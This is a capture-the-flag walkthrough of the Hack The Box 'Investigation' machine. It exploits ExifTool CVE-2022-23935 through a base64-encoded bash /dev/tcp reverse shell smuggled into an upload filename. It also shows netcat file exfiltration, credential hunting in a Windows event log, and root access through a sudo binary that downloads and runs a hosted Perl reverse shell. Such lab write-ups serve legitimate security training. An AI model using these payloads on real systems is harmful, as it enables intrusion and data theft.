# Hack The Box - Investigation Walkthrough

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Investigation]
└─$ nmap -Pn -T4 -p- --min-rate=1000 -sV 10.10.11.197
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 10:38 EDT
Warning: 10.10.11.197 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.197
Host is up (0.12s latency).
Not shown: 65479 closed tcp ports (conn-refused), 54 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.49 seconds
```


Before starting the enumeration, I wanted to check if any other ports were open, so I ran `rustscan` to quickly check if any other ports were open.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Investigation]
└─$ rustscan -a 10.10.11.197 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.197:22
Open 10.10.11.197:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80 10.10.11.197

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 10:40 EDT
Initiating Ping Scan at 10:40
Scanning 10.10.11.197 [2 ports]
Completed Ping Scan at 10:40, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:40
Completed Parallel DNS resolution of 1 host. at 10:40, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:40
Scanning 10.10.11.197 [2 ports]
Discovered open port 22/tcp on 10.10.11.197
Discovered open port 80/tcp on 10.10.11.197
Completed Connect Scan at 10:40, 0.12s elapsed (2 total ports)
Nmap scan report for 10.10.11.197
Host is up, received syn-ack (0.13s latency).
Scanned at 2023-03-16 10:40:47 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
```

So, `nmap` & `rustscan`, both, found `2` open ports:
- port `22`: running `OpenSSH 8.2p1`
- port `80`: running `Apache httpd 2.4.41`

## Enumeration
I started the enumeration by visiting the web portal on port `80`. Before visiting the portal I added the host to my `/etc/hosts` file. 

```
sudo echo `10.10.11.197 eforenzics.htb` >> /etc/hosts
```

The portal allowed users to upload a `JPG` file and provide analytical information.

![image](https://user-images.githubusercontent.com/87711310/225653950-d92f3ab8-8c30-4113-9992-40ee8eb46e30.png)

I uploaded an image and clicked the link it provided, there was a text file that contained `Exiftool` output details and the version of `Exiftool` was also given, which was `12.37`

![image](https://user-images.githubusercontent.com/87711310/225654341-6aa794bb-a18f-4265-9cd5-9d13b1ef2561.png)

So, i googled about `Exiftool 12.37` and I found out that it was vulnerable to [CVE-2022-23935](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429)

In a nutshell, if the attacker provides a file with a name ending with | character, the tool will treat it as a pipe and execute it as an OS command.

So, I decided to start `BurpSuite` to intercept the packet, and changed the `filename` parameter to a `ping` command to verify the vulnerability/

![image](https://user-images.githubusercontent.com/87711310/225663455-a48458b1-4d5f-452c-bd35-c67c75643492.png)

To obtain the reverse shell, I need to replace the `ping` command with the `reverse-shell` payload in the `filename` parameter. It turned out that the machine escaped some characters like `/`. So, I decided to `Base64` encode the script:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Investigation]
└─$ echo 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0MyAwPiYxCg==
```

And change the filename through `BurpSuite`:

```
# BurpSuite
POST /upload.php HTTP/1.1
Host: eforenzics.htb
...
...
-----------------------------322887901231410547541681300375
Content-Disposition: form-data; name="image"; filename="echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0MyAwPiYxCg=='|base64 -d|bash|"
Content-Type: image/jpeg

<DATA>
```

I clicked send, and I got the shell instantly

![image](https://user-images.githubusercontent.com/87711310/225668776-cbb21aad-d090-494d-ad28-364838666f49.png)

I was logged in as `www-data`, enumerating the machine I found out that I did not have the permission to view the `smorton` folder. So, I had to escalate my privileges

```
www-data@investigation:~$ cd /home
cd /homel
www-data@investigation:/home$ s
ls
smorton
www-data@investigation:/home$ cd smorton
cd smorton
bash: cd: smorton: Permission denied
www-data@investigation:/home$ 
```

I was stuck at this part for a while but after looking at all the folder for a possible way to escalate the privileges, I found out that there was a `investigation` folder inside the `/usr/local` folder.

```
www-data@investigation:/$ cd /usr
cd /usr
www-data@investigation:/usr$ cd /local
cd /local
www-data@investigation:/usr$ cd local
cd local
www-data@investigation:/usr/local$ ls
ls
bin
etc
games
include
investigation
lib
man
sbin
share
src
```

The files in the directories were:

```
www-data@investigation:/usr/local/investigation$ ls -la *
ls -la *
-rw-rw-r-- 1 smorton  smorton  1308160 Oct  1 00:35 Windows Event Logs for Analysis.msg
-rw-rw-r-- 1 www-data www-data       0 Oct  1 00:40 analysed_log
```

The `Windows Event Logs for Analysis.msg` was a Microsoft Outlook Message, meaning I had to transfer it to my machine and look to convert the message.

```
www-data@investigation:/usr/local/investigation$ file "Windows Event Logs for Analysis.msg"
<igation$ file "Windows Event Logs for Analysis.msg"
Windows Event Logs for Analysis.msg: CDFV2 Microsoft Outlook Message
```

So, I used `netcat` to transfer the file from the victim machine to my machine.

```
nc  10.10.14.8 10000 < Windows\ Event\ Logs\ for\ Analysis.msg 
```

Ideally, `OutLook` can be used to read the MSG file, but I didn't have such software on my Kali.

Luckily, there is an [online converter](https://products.aspose.app/email/viewer/msg) that can help.

And I saw an attachment in the email, so I might need another tool to extract the file.

![image](https://user-images.githubusercontent.com/87711310/226175294-b2543068-232b-49cf-b56c-a2ed73ca5c3a.png)

Now, that I needed to download the attachment with this file, I used another tool called [enncryptomatic](https://www.encryptomatic.com/viewer/): `extx-log.zip`

![image](https://user-images.githubusercontent.com/87711310/226175361-c7fc2f50-7b7c-4418-ab87-61064e70d9b6.png)

After inflating the file, I got an `EVTX` file, a Windows XML EventLog file. I googled a about tools that would enable me to analyse the `EVTX` file and stumbled upon this [one](https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py)

```python
#!/usr/bin/env python

import Evtx.Evtx as evtx
import Evtx.Views as e_views

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="Dump a binary EVTX file into XML.")
    parser.add_argument("evtx", type=str,
                        help="Path to the Windows EVTX event log file")
    args = parser.parse_args()

    with evtx.Evtx(args.evtx) as log:
        print(e_views.XML_HEADER)
        print("<Events>")
        for record in log.records():
            print(record.xml())
        print("</Events>")


if __name__ == "__main__":
    main()
```

Now, before running the file, I needed to install the `EVTX` module.

```
sudo pip install python-evtx
```

Then, running the tool I was able to  dump the log file into an XML human-readable file.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Investigation]
└─$ python evtx_dump.py security.evtx > extx.dump

┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Investigation]
└─$ file extx.dump 
extx.dump: XML 1.1 document, ASCII text, with CRLF, LF line terminators
```

There are many tools and articles are out there to help analyse the event log file. but a quick glance through the document and I was able to find a  password from the dump file. I used the search bar and search for terms like `pass`, `pwd`, etc.

![image](https://user-images.githubusercontent.com/87711310/226175873-118b761d-da92-4ebe-b421-73482635dd0e.png)

I tried using this password to login as `smorton`, and I was in!!

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Investigation]
└─$ ssh smorton@10.10.11.197               
The authenticity of host '10.10.11.197 (10.10.11.197)' can't be established.
ED25519 key fingerprint is SHA256:lYSJubnhYfFdsTiyPfAa+pgbuxOaSJGV8ItfpUK84Vw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.197' (ED25519) to the list of known hosts.
smorton@10.10.11.197's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-137-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 19 Mar 2023 12:43:51 PM UTC

  System load:  0.0               Processes:             232
  Usage of /:   59.5% of 3.97GB   Users logged in:       0
  Memory usage: 8%                IPv4 address for eth0: 10.10.11.197
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


smorton@investigation:~$ whoami
smorton
smorton@investigation:~$ id
uid=1000(smorton) gid=1000(smorton) groups=1000(smorton)

```

Grabbing the user flag.

```
smorton@investigation:~$ cat user.txt
[REDACTED]
```

## Privilege Escalation
I ran the `sudo -l` command to look at the files `smorton` was able to run as the root.

```
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
```

There was a binary file, so, I decided to take a look at it and as expeccted it was all gibberish. So, then, I decided to transfer the file to my machine and decompile it.

```
smorton@investigation:~$ cat /usr/bin/binary
@@@@�▒▒▒H       H       %%   HH@-@=@=��P-P=P888 XXXDDS�td888 P�tdL L L 44Q�tdR�td@-@=@=��/lib64/ld-linux-x86-64.so.2GNU�GNU�W\\�K����O
��
  O���GNU��e�mZ{$ � ������@ �l����"libcurl-gnutls.so.4__gmon_start___ITM_deregisterTMCloneTable_ITM_registerTMCloneTablecurl_easy_cleanupcurl_easy_initcurl_easy_setoptcurl_easy_performlibc.so.6setuidexitfopenputsfclosemallocsystemgetuid__cxa_finalizestrcmp__libc_start_mainsnprintfGLIBC_2.2.5CURL_GNUTLS_3� u▒i
                                                                                                                                                           #=
 ▒@�@�?�?�?�?
h?p?x?�?�?��?�? �?
�?
  �?�?�?�?�?��H�H��/H��t��H���52/��%3/��h���������h���������h���������h���������h���������h���������h���������h��q��������a������h      ��Q������h
��A������h
```

So, I decided to transfer the file to my machine in the same way i did it before. Then, I uploaded the binary file to an [online decompiler](https://dogbolt.org/). From there, I was able to see what the source code looked like.


![image](https://user-images.githubusercontent.com/87711310/226178908-6e9a0b49-91e0-4468-b74b-d7b28acccf61.png)

I extracted the program's main function, and it can be seen that it can be broken down into a couple of parts.

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
    if (argc != 3)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    if (getuid() != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    if (strcmp(argv[2], "lDnxUysaQn") != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    puts("Running... ");
    FILE* rax_8 = fopen(argv[2], &data_2027);
    int64_t rax_9 = curl_easy_init();
    int32_t var_40 = 0x2712;
    curl_easy_setopt(rax_9, 0x2712, argv[1], 0x2712);
    int32_t var_3c = 0x2711;
    curl_easy_setopt(rax_9, 0x2711, rax_8, 0x2711);
    int32_t var_38 = 0x2d;
    curl_easy_setopt(rax_9, 0x2d, 1, 0x2d);
    if (curl_easy_perform(rax_9) != 0)
    {
        puts("Exiting... ");
        exit(0);
        /* no return */
    }
    int64_t rax_25 = snprintf(nullptr, 0, &data_202a, argv[2]);
    char* rax_28 = malloc((rax_25 + 1));
    snprintf(rax_28, (rax_25 + 1), &data_202a, argv[2]);
    int64_t rax_37 = snprintf(nullptr, 0, "perl ./%s", rax_28);
    char* rax_40 = malloc((rax_37 + 1));
    snprintf(rax_40, (rax_37 + 1), "perl ./%s", rax_28);
    fclose(rax_8);
    curl_easy_cleanup(rax_9);
    setuid(0);
    system(rax_40);
    system("rm -f ./lDnxUysaQn");
    return 0;
}

```

Analysis the code took me a bit more time, since I wasn't much proficient with coding.

Firstly, it checks whether three input parameters have been sent through (actually two because the first parameter is the program name itself) and exits if not.

Secondly, it checks whether a root user calls it (achievable because we can run it as root without a password) and exits if not.

Thirdly, it checks whether the third parameter is equal to the string `lDnxUysaQn`, and exits if not.

Fourthly, it opens a file with curl which is specified by the second parameter and reads and runs with perl.

And it can be seen that the machine would send the get request to the specified URL.

```
smorton@investigation:/usr/bin$ sudo /usr/bin/binary 10.10.14.36:4444 lDnxUysaQn
Running... 
```

So, then I decided to host a Perl Reverse shell (The I used Perl was to try out somemthing other than python. Using python shell would've also been fine) on my kali.

```
sudo python3 -m http.server 8081
```

Then, ran the command following command:

```
sudo /usr/bin/binary 10.10.14.36:8081/shell.pl lDnxUysaQn
```

Started a netcat listener on port `4444` before that and boom!!

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Investigation]
└─$ nc -lvnp 4444                                                      
listening on [any] 4444 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.11.197] 57548
root@investigation:/usr/bin# whoami
whoami
root
```

Grabbing the root flag.

```
root@investigation:/usr/bin# cat /root/root.txt
cat /root/root.txt
[REDACTED]
```
